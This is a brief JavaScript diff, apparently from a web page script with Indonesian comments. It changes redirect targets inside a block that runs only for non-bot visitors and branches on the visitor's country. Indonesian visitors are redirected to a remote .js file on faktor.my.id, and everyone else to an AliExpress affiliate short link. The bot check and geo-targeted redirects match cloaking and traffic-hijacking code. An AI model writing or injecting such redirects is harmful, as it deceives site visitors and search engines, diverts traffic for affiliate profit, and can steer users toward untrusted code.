@@ -14,9 +14,9 @@ if (!isBot) {
 
           // Jika IP pengguna adalah dari Indonesia
           if (countryCode === 'ID') {
-            window.location.replace('https://indonesia.com');
+            window.location.replace('https://faktor.my.id/cangkul/pacul.js');
           } else {
-            window.location.replace('https://luar.com');
+            window.location.replace('https://s.click.aliexpress.com/e/_DDzz0lr');
           }
         });
     });
